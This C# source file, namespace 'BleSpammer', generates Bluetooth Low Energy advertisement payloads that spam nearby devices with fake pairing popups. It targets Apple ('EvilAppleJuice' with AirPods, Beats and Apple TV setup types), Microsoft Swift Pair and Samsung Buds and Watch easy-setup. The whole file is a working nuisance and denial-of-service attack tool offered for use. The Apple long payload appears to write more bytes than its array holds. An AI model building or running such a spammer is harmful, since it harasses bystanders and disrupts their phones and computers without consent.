using System.Diagnostics;
using System.Text;

namespace BleSpammer {

    internal class SpamManager     {

        //-------------------------------------------------------------------------------------------------------------------------------
        private static SpamManager m_Instance = null;
        //-------------------------------------------------------------------------------------------------------------------------------

        //-------------------------------------------------------------------------------------------------------------------------------
        public static SpamManager Instance { get { if (m_Instance == null) m_Instance = new SpamManager(); return m_Instance; } }
        //-------------------------------------------------------------------------------------------------------------------------------

        public enum SpamTargetType {
            Apple,
            Microsoft,
            Samsung,
        };

        public byte[] Payload(SpamTargetType spamTarget) {
            byte[] spamPayload = null;
            switch (spamTarget) {
                case SpamTargetType.Apple       : return EvilAppleJuice;
                case SpamTargetType.Microsoft   : return MicrosoftSwiftPair; 
                case SpamTargetType.Samsung     : return SamsungBudsPopup;
            }
            return null;
        }

        #region Apple

        private enum AppleLongType {
            Airpods             = 0x02,
            AirpodsPro          = 0x0e,
            AirpodsMax          = 0x0a,
            AirpodsGen2         = 0x0f,
            AirpodsGen3         = 0x13,
            AirpodsProGen2      = 0x14,
            PowerBeats          = 0x03,
            PowerBeatsPro       = 0x0b,
            BeatsSoloPro        = 0x0c,
            BeatsStudioBuds     = 0x11,
            BeatsFlex           = 0x10,
            BeatsX              = 0x05,
            BeatsSolo3          = 0x06,
            BeatsStudio3        = 0x09,
            BeatsStudioPro      = 0x17,
            BetasFitPro         = 0x12,
            BeatsStudioBudsPlus = 0x16,
        }
        private enum AppleShortType {
                AppleTVSetup               = 0x01,
                AppleTVPair                = 0x06,
                AppleTVNewUser             = 0x20,
                AppleTVAppleIDSetup        = 0x2b,
                AppleTVWirelessAudioSync   = 0xc0,
                AppleTVHomekitSetup        = 0x0d,
                AppleTVKeyboardSetup       = 0x13,
                AppleTVConnectingToNetwork = 0x27,
                HomepodSetup               = 0x0b,
                SetupNewPhone              = 0x09,
                TransferNumber             = 0x02,
                TVColorBalance             = 0x1e,
                VisionPro                  = 0x24,
        }

        enum AppleDataType {
            Long  = 31,
            Short = 15,
        };

        public byte[] EvilAppleJuice {
            get {
                AppleDataType type = (AppleDataType)Random.Shared.Next(2);
                byte[] advertisementData = new byte[(byte)type ];
                int i=0;
                switch (type) {
                    case AppleDataType.Long: {
                        advertisementData[i++] = 0x1e;
                        advertisementData[i++] = 0xff;
                        advertisementData[i++] = 0x4c;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x07;
                        advertisementData[i++] = 0x19;
                        advertisementData[i++] = 0x07;
                        advertisementData[i++] = (byte)Enum.GetValues<AppleLongType>()[Random.Shared.Next(Enum.GetValues<AppleLongType>().Length)];// 0x02; //<--
                        advertisementData[i++] = 0x20;
                        advertisementData[i++] = 0x75;
                        advertisementData[i++] = 0xaa;
                        advertisementData[i++] = 0x30;
                        advertisementData[i++] = 0x01;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x45;
                        advertisementData[i++] = 0x12;
                        advertisementData[i++] = 0x12;
                        advertisementData[i++] = 0x12;
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        advertisementData[i++] = 0x00; // quitar
                        break;
                    }
                    case AppleDataType.Short: {
                        advertisementData[i++] = 0x16;
                        advertisementData[i++] = 0xff;
                        advertisementData[i++] = 0x4c;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x04;
                        advertisementData[i++] = 0x04;
                        advertisementData[i++] = 0x2a;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x0f;
                        advertisementData[i++] = 0x05;
                        advertisementData[i++] = 0xc1;
                        advertisementData[i++] = (byte)Enum.GetValues<AppleShortType>()[Random.Shared.Next(Enum.GetValues<AppleShortType>().Length)];
                        advertisementData[i++] = 0x60;
                        advertisementData[i++] = 0x4c;
                        advertisementData[i++] = 0x95;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x10;
                        advertisementData[i++] = 0x00; // Quitar
                        advertisementData[i++] = 0x00; // Quitar
                        advertisementData[i++] = 0x00; // Quitar
                        break;
                    }
                }

                return advertisementData;
            }
        }
        #endregion

        #region  Microsoft
        public byte[] MicrosoftSwiftPair {
            get {
                string name = new(Enumerable.Range(0, Random.Shared.Next(1, 11)).Select(_ => (char)Random.Shared.Next(65, 91)).ToArray());

                Debug.WriteLine($"{name}");
                List<byte> advertisementData= new List<byte>();

                advertisementData.Add((byte)(6 + name.Length)); // Size
                advertisementData.Add(0xFF);
                advertisementData.Add(0x06);
                advertisementData.Add(0x00);
                advertisementData.Add(0x03);
                advertisementData.Add(0x00);
                advertisementData.Add(0x80);
                advertisementData.AddRange(Encoding.ASCII.GetBytes(name));
                advertisementData.Add(0x00);
                return advertisementData.ToArray();
            }
        }
        #endregion

        #region Samsung
        //-------------------------------------------------------------------------------------------------------------------------------
        private Dictionary<uint,string> BudModels = new Dictionary<uint, string>() {
            {0xEE7A0C, "Fallback Buds"},
            {0x9D1700, "Fallback Dots"},
            {0x39EA48, "Light Purple Buds2"},
            {0xA7C62C, "Bluish Silver Buds2"},
            {0x850116, "Black Buds Live"},
            {0x3D8F41, "Gray & Black Buds2"},
            {0x3B6D02, "Bluish Chrome Buds2"},
            {0xAE063C, "Gray Beige Buds2"},
            {0xB8B905, "Pure White Buds"},
            {0xEAAA17, "Pure White Buds2"},
            {0xD30704, "Black Buds"},
            {0x9DB006, "French Flag Buds"},
            {0x101F1A, "Dark Purple Buds Live"},
            {0x859608, "Dark Blue Buds"},
            {0x8E4503, "Pink Buds"},
            {0x2C6740, "White & Black Buds2"},
            {0x3F6718, "Bronze Buds Live"},
            {0x42C519, "Red Buds Live"},
            {0xAE073A, "Black & White Buds2"},
            {0x011716, "Sleek Black Buds2"},

        };
        private Dictionary<byte,string> WatchModels = new Dictionary<byte, string>() {
            {0x1A, "Fallback Watch"},
            {0x01, "White Watch4 Classic"},
            {0x02, "Black Watch4 Classic"},
            {0x03, "White Watch4 Classic"},
            {0x04, "Black Watch4m"},
            {0x05, "Silver Watch4m"},
            {0x06, "Green Watch4m"},
            {0x07, "Black Watch4m"},
            {0x08, "White Watch4m"},
            {0x09, "Gold Watch4m"},
            {0x0A, "French Watch4"},
            {0x0B, "French Watch4 Classic"},
            {0x0C, "Fox Watch5m"},
            {0x11, "Black Watch5m"},
            {0x12, "Sapphire Watch5m"},
            {0x13, "Purpleish Watch5m"},
            {0x14, "Gold Watch5m"},
            {0x15, "Black Watch5 Pro 45mm"},
            {0x16, "Gray Watch5 Pro 45mm"},
            {0x17, "White Watch5m"},
            {0x18, "White & Black Watch5"},
            {0xE4, "Black Watch5 Golf Edition"},
            {0xE5, "White Watch5 Gold Edition"},
            {0x1B, "Black Watch6 Pinkm"},
            {0x1C, "Gold Watch6 Goldm"},
            {0x1D, "Silver Watch6 Cyanm"},
            {0x1E, "Black Watch6 Classic"},
            {0x20, "Green Watch6 Classic"},
            {0xEC, "Black Watch6 Golf Edition"},
            {0xEF, "Black Watch6 TB Edition"},
        };
        //-------------------------------------------------------------------------------------------------------------------------------

        enum EasysetupType {
            Buds,
            Watch,
        };
        public byte[] SamsungBudsPopup {
            get {
                EasysetupType type = (EasysetupType)Random.Shared.Next(2);
                int size = type == EasysetupType.Buds ? 31 : 15;

                byte[] advertisementData = new byte[size ];

                int i = 0;

                switch (type) {
                    case EasysetupType.Buds: {
                        KeyValuePair<uint,string> model = BudModels.ElementAt(Random.Shared.Next(0, BudModels.Count));


                        Debug.WriteLine($"{model.Value}");

                        advertisementData[i++] = 27; // Size
                        advertisementData[i++] = 0xFF; // AD Type (Manufacturer Specific)
                        advertisementData[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
                        advertisementData[i++] = 0x00; // ...
                        advertisementData[i++] = 0x42;
                        advertisementData[i++] = 0x09;
                        advertisementData[i++] = 0x81;
                        advertisementData[i++] = 0x02;
                        advertisementData[i++] = 0x14;
                        advertisementData[i++] = 0x15;
                        advertisementData[i++] = 0x03;
                        advertisementData[i++] = 0x21;
                        advertisementData[i++] = 0x01;
                        advertisementData[i++] = 0x09;
                        advertisementData[i++] = (byte)((model.Key >> 0x10) & 0xFF); // Buds Model / Color (?)
                        advertisementData[i++] = (byte)((model.Key >> 0x08) & 0xFF); // ...
                        advertisementData[i++] = 0x01; // ... (Always static?)
                        advertisementData[i++] = (byte)((model.Key >> 0x00) & 0xFF); // ...
                        advertisementData[i++] = 0x06;
                        advertisementData[i++] = 0x3C;
                        advertisementData[i++] = 0x94;
                        advertisementData[i++] = 0x8E;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0xC7;
                        advertisementData[i++] = 0x00;

                        advertisementData[i++] = 16; // Size
                        advertisementData[i++] = 0xFF; // AD Type (Manufacturer Specific)
                        advertisementData[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
                                                        // Truncated AD segment, Android seems to fill in the rest with zeros
                        break;
                    }
                    case EasysetupType.Watch: {

                        KeyValuePair<byte,string> model = WatchModels.ElementAt(Random.Shared.Next(0, WatchModels.Count));

                        Debug.WriteLine($"{model.Value}");

                        advertisementData[i++] = 14; // Size
                        advertisementData[i++] = 0xFF; // AD Type (Manufacturer Specific)
                        advertisementData[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
                        advertisementData[i++] = 0x00; // ...
                        advertisementData[i++] = 0x01;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x02;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x01;
                        advertisementData[i++] = 0x01;
                        advertisementData[i++] = 0xFF;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x00;
                        advertisementData[i++] = 0x43;
                        advertisementData[i++] = (byte)((model.Key >> 0x00) & 0xFF); // Watch Model / Color (?)
                        break;
                    }
                }

                return advertisementData;
            }
        }
        #endregion
    }
}
